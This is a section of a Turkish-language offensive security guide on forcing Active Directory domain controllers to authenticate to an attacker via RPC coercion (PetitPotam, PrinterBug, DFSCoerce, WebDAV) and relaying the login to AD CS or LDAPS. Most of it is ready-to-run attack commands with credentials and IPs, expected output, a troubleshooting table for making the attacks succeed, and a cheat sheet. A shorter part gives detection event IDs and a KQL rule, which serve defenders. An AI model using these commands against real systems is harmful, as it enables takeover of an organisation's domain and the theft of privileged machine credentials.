## 1. Genel Bakış ve Koersiyon (Zorlamalı Kimlik Doğrulama) Felsefesi

[08.1 NTLM Relay](./08.1_NTLM_Relay_Senaryolari.md) saldırılarının başarıya ulaşması için bir kurbanın saldırgana kimlik doğrulaması göndermesi şarttır. LLMNR/NBT-NS ağ zehirlemesi (Poisoning) pasiftir ve rastgele kullanıcı trafiğine bağımlıdır.

**Koersiyon (Coercion)**, saldırganın inisiyatifi tamamen eline almasını sağlar:
> **Windows işletim sistemlerindeki meşru RPC arayüzlerinin tasarım kusurları kullanılarak, hedef bir sunucu (özellikle Domain Controller); saldırganın belirlediği bir adrese (`\\attacker\share` veya `\\attacker@80\webdav`), saldırganın istediği anda kendi makine hesabıyla (`DC01$`) kimlik doğrulamaya ZORLANIR.**

Bu mekanizma sayesinde saldırgan:
- Pasif ağ trafiğini beklemez; doğrudan Tier-0 Domain Controller'ı hedefler.
- Gelen kimlik doğrulaması sıradan bir kullanıcı değil, etki alanının en güçlü varlığı olan **DC makine hesabı (`DC01$`)** kimliğindedir.
- Bu bağlantı [08.3 ESC8](./08.3_Relay_AD_CS_ESC8_Zinciri.md) ile AD CS'e aktarıldığında anında domain yöneticiliği elde edilir.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                 RPC KOERSİYON VE ZORLAMALI BAĞLANTI MİMARİSİ                │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
          [SALDIRGAN (Coercer / PetitPotam)]         [HEDEF (Domain Controller)]
                          │                                      │
                          │── 1. RPC Çağrısı (Port 135/445) ────▶│
                          │   "\\ATTACKER\share yolunu kontrol et"│
                          │   (MS-EFSR, MS-RPRN, MS-DFSNM)       │
                          │                                      │
                          │                                      │ DC01$ Makine Kimliğiyle
                          │                                      │ Geri Bağlantı Başlatır:
                          │◀─ 2. NTLM SMB/HTTP Kimlik Doğrulama ─│
                          │   (NetNTLMv2 Challenge-Response)     │
                          │                                      │
                          ▼                                      ▼
             [3. ntlmrelayx Dinleyicisi Yakalar]     [4. Relay Hedefine İletir]
             - HTTP Web Enrollment (ESC8)            - DC01$ Sertifikası Alınır
             - LDAPS Servisi (WebDAV ile)            - RBCD Yetkisi Yazılır
```

### 1.1 Başlıca RPC Koersiyon Vektörleri Karşılaştırması

| Koersiyon Tekniği | Protokol & RPC Arayüzü | İstismar Edilen API Fonksiyonu | Named Pipe | Kapatma & Savunma Durumu |
|---|---|---|---|---|
| **PetitPotam** | MS-EFSRPC (Encrypting File System) | `EfsRpcOpenFileRaw`, `EfsRpcEncryptFileSrv` | `\PIPE\efsrpc`, `\PIPE\lsarpc` | CVE-2021-36942 anonimi kapattı; kimlik doğrulamalı çağrılar açıktır. |
| **PrinterBug** | MS-RPRN (Print System Remote Protocol) | `RpcRemoteFindFirstPrinterChangeNotificationEx` | `\PIPE\spoolss` | Print Spooler servisi kapatılarak tamamen engellenebilir. |
| **DFSCoerce** | MS-DFSNM (Distributed File System) | `NetrDfsAddStdRoot`, `NetrDfsRemoveStdRoot` | `\PIPE\netdfs` | **En Tehlikelisi:** DFS DC'lerde temel servistir; kapatılamaz, RPC filtresi gerekir. |
| **ShadowCoerce** | MS-FSRVP (File Server Remote VSS) | `IsPathSupported` | `\PIPE\FssagentRpc` | Dosya sunucusu VSS gölge kopyalama servisi açıksa çalışır. |
| **WebDAV Coercion** | WebClient HTTP | `\\attacker@80\path` formatında UNC | WebClient Service | **HTTP NTLM** üretir; SMB signing engelini aşar, LDAP relay sağlar. |

## 2. Derinlemesine Teknik Mekanizmalar

### 2.1 SMB vs. HTTP / WebDAV Koersiyonu (Kritik Ayrım)
Bir Domain Controller'ı `\\10.10.10.200\share` formatında zorladığınızda giden trafik **SMB (Port 445)** üzerinden akar.
- SMB kaynaklı NTLM kimlik doğrulamalarında SMB İmzalama (SMB Signing) zorunluluğu nedeniyle DC'nin LDAPS servisine relay yapılamaz (MIC drop yamasından sonra).
- **WebDAV Hilesi:** Eğer hedef sistemde `WebClient` servisi çalışıyorsa veya tetiklenebiliyorsa, UNC yolu `\\10.10.10.200@80/test` veya `\\10.10.10.200@SSL@443/test` olarak verilir.
- Bu çağrı DC'nin işletim sistemini saldırgana **HTTP protokolü üzerinden NTLM doğrulaması** göndermeye zorlar.
- **Kazanım:** HTTP oturumları imza taşımadığı için doğrudan **Domain Controller'ın LDAPS (Port 636) servisine relay edilebilir** ve hedef makine adına RBCD yazılabilir.

### 2.2 PetitPotam Yama Sonrası Durum (CVE-2021-36942)
Microsoft'un yayımladığı güvenlik güncellemesi yalnızca `EfsRpcOpenFileRaw` fonksiyonuna yönelik anonim (NULL session) çağrıları engelledi:
- Düşük yetkili sıradan bir kullanıcı hesabı (`jdoe`) sağlandığında PetitPotam; `EfsRpcEncryptFileSrv`, `EfsRpcAddUsersToFile` ve `EfsRpcQueryUsersOnFile` fonksiyonlarını kullanarak DC'yi tetiklemeye devam eder (`-pipe all`).

## 3. Pratik Sömürü Senaryoları ve Araç Kullanımı

### Senaryo 1: Coercer ile Etki Alanındaki Açık RPC Vektörlerini Tarama
```bash
# Hedef Domain Controller üzerindeki tüm koersiyon vektörlerini güvenli bir şekilde tara
coercer scan -u jdoe -p 'Welcome123!' -d corp.local -t 10.10.10.5
```
**Beklenen Operasyonel Çıktı:**
```
[+] MS-EFSRPC     EfsRpcOpenFileRaw       (2) ERROR_BAD_NETPATH  --> VULNERABLE
[+] MS-DFSNM      NetrDfsAddStdRoot       (2) ERROR_BAD_NETPATH  --> VULNERABLE
[-] MS-RPRN       RpcRemoteFindFirst...   Spooler Service Disabled
```

### Senaryo 2: PetitPotam ile Domain Controller Koersiyonu
```bash
# 1. Terminal 1: ntlmrelayx dinleyicisini başlat (ESC8 AD CS hedefli)
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --template DomainController

# 2. Terminal 2: PetitPotam ile DC01'i dinleyiciye bağlanmaya zorla
python3 PetitPotam.py -u jdoe -p 'Welcome123!' -d corp.local 10.10.10.200 10.10.10.5
```

### Senaryo 3: PrinterBug (SpoolSample / dementor) ile Koersiyon
```bash
# Print Spooler servisi açık olan DC'yi saldırgan makinesine zorlama
python3 dementor.py -u jdoe -p 'Welcome123!' -d corp.local 10.10.10.200 10.10.10.5
```

### Senaryo 4: DFSCoerce ile Kapatılamayan DFS Servisi Üzerinden Koersiyon
```bash
# Spooler ve EFSRPC kapalı olsa dahi DFSNM arayüzü üzerinden tetikleme
python3 dfscoerce.py -u jdoe -p 'Welcome123!' -d corp.local 10.10.10.200 10.10.10.5
```

### Senaryo 5: WebDAV Formatında HTTP Koersiyon Tetikleme
```bash
# PetitPotam ile WebDAV portu (@80) belirterek HTTP NTLM oturumu ürettirme (LDAP relay için)
python3 PetitPotam.py -u jdoe -p 'Welcome123!' -d corp.local -pipe all '10.10.10.200@80/test' 10.10.10.5
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata / İstisna Mesajı | Kök Neden Analizi | Kesin Çözüm ve Operasyonel Adım |
|---|---|---|
| `nca_s_proto_error / 0x6ba (RPC Unavailable)` | Hedef sistemde ilgili named pipe kapalı veya güvenlik duvarı RPC (Port 135 / SMB 445) engelliyor. | Alternatif vektörleri deneyin (`Coercer` ile tarayın); Spooler kapalıysa DFSCoerce veya PetitPotam kullanın. |
| `rpc_s_access_denied (0x5)` | Hedef RPC fonksiyonuna erişim kısıtlanmış veya anonim erişim engellenmiş. | Kimlik doğrulamalı parametreler girin (`-u` ve `-p`); RPC filtreleme kuralı varsa DFSNM arayüzünü test edin. |
| `ERROR_BAD_NETPATH (0x35 / 53)` | Bu bir hata DEĞİLDİR; saldırının başarılı olduğunu ve DC'nin saldırgan IP'sine bağlanmaya çalıştığını gösterir. | ntlmrelayx konsolunuzu kontrol edin; kurban makine kimlik doğrulaması yakalanmış olmalıdır. |
| `SMB Session Error: STATUS_PIPE_NOT_AVAILABLE` | `\PIPE\spoolss` servisi DC üzerinde sistem yöneticisi tarafından devre dışı bırakılmış. | `NetExec smb <IP> -M spooler` ile durumu teyit edin; PrinterBug yerine DFSCoerce'e geçin. |
| `Relay failed: NetNTLMv1/v2 Session dropped` | ntlmrelayx dinleyicisi koersiyon tetiklenmeden önce hazır değildi; zaman aşımı oluştu. | Her zaman önce dinleyiciyi (`ntlmrelayx`) başlatın, ardından koersiyon komutunu çalıştırın. |
| `WebDAV auth not received (SMB fallback)` | Hedef sunucuda `WebClient` servisi çalışmıyor; sistem SMB (445) üzerinden bağlanmaya çalıştı. | Makinede WebClient servisini tetikleyecek `.searchConnector-ms` dosyasını paylaşın veya doğrudan ESC8 HTTP relay'e yönelin. |

## 5. OPSEC ve Karşı Tespit (IOC & Telemetry)

### 5.1 Olay Günlüğü İmzaları (Windows Security Logs)
- **Sysmon Event ID 18 (Pipe Connected):** DC üzerinde sıra dışı istemciler tarafından `\PIPE\efsrpc`, `\PIPE\spoolss`, `\PIPE\netdfs` veya `\PIPE\lsarpc` pipe bağlantılarının açılması.
- **Event ID 5145 (Ağ Paylaşımı Nesnesi Denetlendi):** `IPC$` paylaşımı altında ilgili koersiyon named pipe'larına yönelik erişimler.
- **Event ID 4624 (Logon Type 3 - Network):** Domain Controller makine hesabının (`DC01$`) ağdaki bir iş istasyonuna aniden kimlik doğrulaması göndermesi.
- **Ağ Trafiği Anomalisi:** Domain Controller'dan saldırgan IP adresinin 445 veya 80 portuna başlatılan tek yönlü yeni TCP oturumları.

### 5.2 SIEM / EDR Tespit Kuralı (KQL / Sigma)
```kql
// KQL: DC Üzerinde Şüpheli Koersiyon Named Pipe Bağlantıları (Sysmon Event ID 18)
Sysmon_Event
| where EventID == 18
| where PipeName in~ (@"\efsrpc", @"\netdfs", @"\spoolss", @"\FssagentRpc")
| extend SourceIP = tostring(parse_json(ExtendedProperties).SourceIp)
| where SourceIP !in ("127.0.0.1", "::1") and SourceIP !in (DomainControllerSubnets)
| project TimeGenerated, Computer, PipeName, Image, SourceIP
```

## 6. Hızlı Referans / Cheat Sheet

### Komut 1: Coercer ile Otomatik Koersiyon Taraması ve Tetikleme
```bash
coercer coerce -u jdoe -p 'Welcome123!' -d corp.local -l 10.10.10.200 -t 10.10.10.5
```
- **Ne Yapar?** DC üzerindeki tüm koersiyon vektörlerini sırayla deneyerek ilk başarılı olan üzerinden saldırgan IP'sine bağlantı zorlar.
- **Ne Zaman Kullanılır?** Hangi vektörün açık olduğunu bilmeden hızlı ve garantili koersiyon sağlamak için.
- **Parametreler:** `-l`: Dinleyici IP adresi; `-t`: Hedef Domain Controller IP adresi.

### Komut 2: PetitPotam ile Kimlik Doğrulamalı Koersiyon (Yama Sonrası)
```bash
python3 PetitPotam.py -u jdoe -p 'Welcome123!' -d corp.local 10.10.10.200 10.10.10.5
```
- **Ne Yapar?** MS-EFSRPC fonksiyonlarını çağırarak DC01'i dinleyici makinesine bağlanmaya zorlar.
- **Ne Zaman Kullanılır?** DC üzerinde Print Spooler kapalı olduğunda ilk tercih edilecek araç olarak.
- **Parametreler:** `10.10.10.200`: Dinleyici IP; `10.10.10.5`: Tetiklenecek DC.

### Komut 3: DFSCoerce ile Dağıtık Dosya Sistemi Üzerinden Koersiyon
```bash
python3 dfscoerce.py -u jdoe -p 'Welcome123!' -d corp.local 10.10.10.200 10.10.10.5
```
- **Ne Yapar?** MS-DFSNM arayüzünü kullanarak DC üzerinde kapatılması imkânsız olan DFS servisini tetikler.
- **Ne Zaman Kullanılır?** PetitPotam ve PrinterBug'ın engellendiği sıkılaştırılmış ortamlarda.
- **Parametreler:** `jdoe / Welcome123!`: Standart kullanıcı hesabı.

### Komut 4: PrinterBug (dementor.py) ile Spooler Koersiyonu
```bash
python3 dementor.py -u jdoe -p 'Welcome123!' -d corp.local 10.10.10.200 10.10.10.5
```
- **Ne Yapar?** MS-RPRN Print Spooler servisini tetikleyerek DC makine hesabını saldırgana bağlar.
- **Ne Zaman Kullanılır?** Hedef DC'de Spooler servisinin açık olduğu tespit edildiğinde.
- **Parametreler:** `10.10.10.200`: Dinleyici; `10.10.10.5`: Hedef DC.

### Komut 5: WebDAV Portu Belirterek HTTP Koersiyon Üretme
```bash
python3 PetitPotam.py -u jdoe -p 'Welcome123!' -d corp.local -pipe all '10.10.10.200@80/test' 10.10.10.5
```
- **Ne Yapar?** Hedef sistemin SMB yerine HTTP WebDAV üzerinden kimlik doğrulama göndermesini sağlar.
- **Ne Zaman Kullanılır?** Elde edilen kimliğin LDAPS servisine relay edilmesi gerektiğinde (SMB signing baypas).
- **Parametreler:** `'10.10.10.200@80/test'`: WebDAV formatındaki hedef UNC yolu.

### Komut 6: NetExec ile DC Üzerinde Print Spooler Durumunu Kontrol Etme
```bash
nxc smb 10.10.10.5 -u jdoe -p 'Welcome123!' -M spooler
```
- **Ne Yapar?** Hedef makinede Print Spooler servisinin dinleyip dinlemediğini ve PrinterBug'a açık olup olmadığını denetler.
- **Ne Zaman Kullanılır?** Koersiyon yöntemi seçmeden önce keşif aşamasında.
- **Parametreler:** `-M spooler`: Spooler denetim modülü.
